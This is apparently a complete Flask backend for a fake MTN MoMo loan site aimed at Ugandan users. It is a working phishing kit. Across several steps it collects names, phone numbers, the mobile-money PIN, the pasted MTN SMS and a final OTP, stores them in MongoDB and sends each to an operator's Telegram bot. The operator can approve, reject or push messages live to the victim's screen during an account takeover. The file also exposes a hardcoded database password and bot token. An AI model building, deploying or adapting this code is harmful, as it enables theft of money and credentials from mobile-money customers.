from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
import os
import time
import requests

app = Flask(__name__)
app.secret_key = "super_secret_momo_uganda_key"

# MongoDB connection with SSL/TLS fallback for Vercel Serverless environment
MONGO_URI = "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser"
client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
db = client["momo_loan_db"]
applications_collection = db["applications"]

# Dedicated Uganda Telegram Configuration 🇺🇬
TELEGRAM_BOT_TOKEN = "8467275364:AAFJlOk-8cOlhok0XC40s-x604G0YxW_hqs"
TELEGRAM_ADMIN_CHAT_ID = "8965398913"

def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
    db_id = str(app_data.get("_id"))
    
    message = (
        f"🇺🇬 *{stage_title}*\n\n"
        f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
        f"💬 *WhatsApp:* `{app_data.get('whatsapp_phone', '—')}`\n"
        f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
        f"💬 *SMS Message:* `{app_data.get('auth_code', '—')}`\n"
        f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '—')}`\n\n"
        f"🆔 *Application ID:* `{app_data.get('app_id')}`"
    )

    reply_markup = {
        "inline_keyboard": [
            [
                {"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}
            ],
            [
                {"text": "⚠️ Bad SMS / Data", "callback_data": f"badsms_{step_code}_{db_id}"},
                {"text": "⏱️ Stalled User", "callback_data": f"stalled_{step_code}_{db_id}"}
            ],
            [
                {"text": f"❌ Reject {step_code.upper()}", "callback_data": f"reject_{step_code}_{db_id}"},
                {"text": "💬 Message User", "callback_data": f"msg_{step_code}_{db_id}"}
            ]
        ]
    }
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": reply_markup
    }
    
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram alert error: {e}")

@app.route("/health")
def health():
    try:
        client.admin.command('ping')
        return jsonify({"status": "ok", "database": "connected", "market": "Uganda"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json() or {}
        print("=== TELEGRAM WEBHOOK RECEIVED ===", data)
        
        # 1. Handle Inline Button Clicks (Approvals, Rejections, Flags)
        if "callback_query" in data:
            callback = data["callback_query"]
            callback_data = callback.get("data", "")
            callback_id = callback.get("id")
            
            parts = callback_data.split("_")
            if len(parts) >= 3:
                action = parts[0]
                step_code = parts[1]
                db_id = parts[2]
                
                text_response = "Action processed"
                
                try:
                    obj_id = ObjectId(db_id)
                except Exception as e:
                    print(f"❌ Invalid ObjectId format: {db_id}, error: {e}")
                    return jsonify({"status": "ok"}), 200

                target_app = applications_collection.find_one({"_id": obj_id})
                if not target_app:
                    target_app = applications_collection.find_one(sort=[("_id", -1)])

                if target_app:
                    actual_obj_id = target_app["_id"]
                    
                    if action == "approve":
                        if step_code == "pin":
                            new_status = "Stage1_Approved"
                        elif step_code == "sms":
                            new_status = "Stage2_Approved"
                        elif step_code == "otp":
                            new_status = "Stage3_Approved"
                        else:
                            new_status = "Approved"

                        res = applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": new_status, "custom_message": ""}}
                        )
                        print(f"✅ Success! Modified count: {res.modified_count} for status -> {new_status}")
                        text_response = f"✅ {step_code.upper()} Approved!"

                    elif action == "reject":
                        if step_code == "pin":
                            new_status = "Reject_PIN"
                            fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
                        elif step_code == "sms":
                            new_status = "Reject_SMS"
                            fail_msg = "❌ SMS message was invalid or expired. Please re-copy and paste."
                        elif step_code == "otp":
                            new_status = "Reject_OTP"
                            fail_msg = "❌ Final OTP incorrect. Please check your messages and try again."
                        else:
                            new_status = "Rejected"
                            fail_msg = "❌ Request rejected. Please try again."

                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": new_status, "custom_message": fail_msg}}
                        )
                        text_response = f"❌ {step_code.upper()} Rejected!"

                    elif action == "badsms":
                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid SMS/data format submitted. Please copy the complete, unedited message from MTN."}}
                        )
                        text_response = "⚠️ Flagged bad input!"

                    elif action == "stalled":
                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Your session is waiting for authorization. Please respond promptly."}}
                        )
                        text_response = "⏱️ Sent stall reminder!"

                    elif action == "msg":
                        applications_collection.update_one(
                            {"_id": actual_obj_id},
                            {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please review your entry and provide the correct information."}}
                        )
                        text_response = "💬 Prompt sent!"

                answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
                try:
                    requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response}, timeout=5)
                except Exception as e:
                    print(f"Answer callback error: {e}")

        # 2. Handle Direct Text Messages & Diagnostic Commands (/test or /diagnose)
        elif "message" in data:
            msg = data["message"]
            chat_id = str(msg.get("chat", {}).get("id"))
            text = msg.get("text", "").strip()
            
            if chat_id == TELEGRAM_ADMIN_CHAT_ID:
                if text == "/test" or text == "/diagnose":
                    diag_results = []
                    diag_status_icon = "🟢"
                    
                    try:
                        client.admin.command('ping')
                        diag_results.append("✅ MongoDB Atlas: Connected & Responsive")
                    except Exception as db_err:
                        diag_status_icon = "🔴"
                        diag_results.append(f"❌ MongoDB Atlas Error: {db_err}")
                        
                    try:
                        wh_res = requests.get(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getWebhookInfo", timeout=5).json()
                        wh_result_data = wh_res.get("result", {})
                        pending = wh_result_data.get("pending_update_count", 0)
                        last_err = wh_result_data.get("last_error_message", "None")
                        diag_results.append(f"✅ Telegram Webhook Active\n   • Pending Updates: `{pending}`\n   • Last Error: `{last_err}`")
                    except Exception as wh_err:
                        diag_status_icon = "🔴"
                        diag_results.append(f"❌ Webhook Info Check Failed: {wh_err}")
                        
                    try:
                        latest_app = applications_collection.find_one(sort=[("_id", -1)])
                        if latest_app:
                            diag_results.append(f"✅ Latest DB Record:\n   • ID: `{latest_app.get('app_id')}`\n   • Status: `{latest_app.get('status')}`")
                        else:
                            diag_results.append("⚠️ MongoDB connected, but no applications found yet.")
                    except Exception as app_err:
                        diag_status_icon = "🟡"
                        diag_results.append(f"⚠️ Latest Record Warning: {app_err}")
                        
                    report_message = (
                        f"{diag_status_icon} *SYSTEM DIAGNOSTIC REPORT* {diag_status_icon}\n\n" +
                        "\n\n".join(diag_results)
                    )
                    
                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    requests.post(reply_url, json={
                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
                        "text": report_message,
                        "parse_mode": "Markdown"
                    })
                    return jsonify({"status": "ok"}), 200

                else:
                    latest_app = applications_collection.find_one(sort=[("_id", -1)])
                    if latest_app:
                        applications_collection.update_one(
                            {"_id": latest_app["_id"]},
                            {"$set": {"custom_message": text, "status": "CustomMessage"}}
                        )
                        reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                        requests.post(reply_url, json={
                            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
                            "text": f"📢 Pushed live to user screen:\n\"{text}\""
                        })

        return jsonify({"status": "ok"}), 200
    except Exception as global_err:
        print(f"❌ Webhook global error caught: {global_err}")
        return jsonify({"status": "ok"}), 200

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/sim-check")
def sim_check():
    return render_template("sim_check.html")

@app.route("/apply/step1", methods=["GET", "POST"])
def apply_step1():
    if request.method == "POST":
        session["loan_type"] = request.form.get("loan_type")
        session["amount"] = request.form.get("amount")
        session["term"] = request.form.get("term")
        session["purpose"] = request.form.get("purpose")
        return redirect(url_for("apply_step2"))
    return render_template("apply_step1.html")

@app.route("/apply/step2", methods=["GET", "POST"])
def apply_step2():
    if request.method == "POST":
        session["first_name"] = request.form.get("first_name")
        session["last_name"] = request.form.get("last_name")
        session["phone"] = request.form.get("phone")
        session["whatsapp_phone"] = request.form.get("whatsapp_phone")  # Capturing WhatsApp input
        return redirect(url_for("apply_step3"))
    return render_template("apply_step2.html")

@app.route("/apply/step3", methods=["GET", "POST"])
def apply_step3():
    if request.method == "POST":
        session["employment"] = request.form.get("employment")
        session["income"] = request.form.get("income")
        return redirect(url_for("processing_screen"))
    return render_template("apply_step3.html")

@app.route("/processing")
def processing_screen():
    return render_template("processing.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pin = request.form.get("pin")
        
        app_data = {
            "loan_type": session.get("loan_type", "MoMoAdvance / MoMoKunga"),
            "amount": session.get("amount", "500000"),
            "term": session.get("term", "3 Months"),
            "purpose": session.get("purpose", "General"),
            "first_name": session.get("first_name", "User"),
            "last_name": session.get("last_name", "Applicant"),
            "phone": session.get("phone", "000000000"),
            "whatsapp_phone": session.get("whatsapp_phone", "Not Provided"),  # Stored in DB
            "employment": session.get("employment", "Self-Employed"),
            "income": session.get("income", "500000"),
            "password": pin,
            "status": "Pending_PIN",
            "created_at": time.time(),
            "app_id": "APP" + os.urandom(4).hex().upper(),
            "auth_code": "",
            "final_auth_code": "",
            "custom_message": ""
        }
        
        inserted_id = applications_collection.insert_one(app_data).inserted_id
        session["current_app_id"] = str(inserted_id)
        
        app_data["_id"] = inserted_id
        send_telegram_interactive_alert(app_data, stage_title="APPROVAL 1: PIN SUBMITTED (UG)", step_code="pin")
        
        return redirect(url_for("pending", app_id=app_data["app_id"]))
    return render_template("login.html")

@app.route("/pending")
def pending():
    app_id = request.args.get("app_id")
    current_id = session.get("current_app_id")
    
    if not app_id and current_id:
        record = applications_collection.find_one({"_id": ObjectId(current_id)})
        app_id = record.get("app_id") if record else "APP-PENDING"
        
    return render_template("pending.html", app_id=app_id)

@app.route("/check-status")
def check_status():
    app_id = request.args.get("app_id")
    record = None
    if app_id:
        record = applications_collection.find_one({"app_id": app_id})
        
    if record:
        session["current_app_id"] = str(record["_id"])
        return jsonify({
            "status": record.get("status", "Pending_PIN"),
            "custom_message": record.get("custom_message", "")
        })
            
    return jsonify({"status": "Pending_PIN", "custom_message": ""})

@app.route("/submit-auth-code", methods=["GET", "POST"])
def submit_auth_code():
    current_id = session.get("current_app_id")
    record = applications_collection.find_one({"_id": ObjectId(current_id)}) if current_id else None
    app_id = record.get("app_id") if record else ""

    if request.method == "POST":
        auth_code = request.form.get("auth_code")
        if current_id:
            applications_collection.update_one(
                {"_id": ObjectId(current_id)},
                {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
            )
            updated_record = applications_collection.find_one({"_id": ObjectId(current_id)})
            send_telegram_interactive_alert(updated_record, stage_title="APPROVAL 2: SMS SUBMITTED (UG)", step_code="sms")
            
        return redirect(url_for("pending", app_id=app_id))
    
    return render_template("submit_auth_code.html", app_id=app_id)

@app.route("/final-verify", methods=["GET", "POST"])
def final_verify():
    current_id = session.get("current_app_id")
    record = applications_collection.find_one({"_id": ObjectId(current_id)}) if current_id else None
    app_id = record.get("app_id") if record else ""

    if request.method == "POST":
        final_code = request.form.get("final_code")
        if current_id:
            applications_collection.update_one(
                {"_id": ObjectId(current_id)},
                {"$set": {"final_auth_code": final_code, "status": "Pending_OTP"}}
            )
            updated_record = applications_collection.find_one({"_id": ObjectId(current_id)})
            send_telegram_interactive_alert(updated_record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED (UG)", step_code="otp")
            
        return redirect(url_for("pending", app_id=app_id))
    return render_template("final_verify.html", app_id=app_id)

@app.route("/success")
def success():
    return render_template("success.html")

if __name__ == "__main__":
    app.run(debug=True, port=5000)
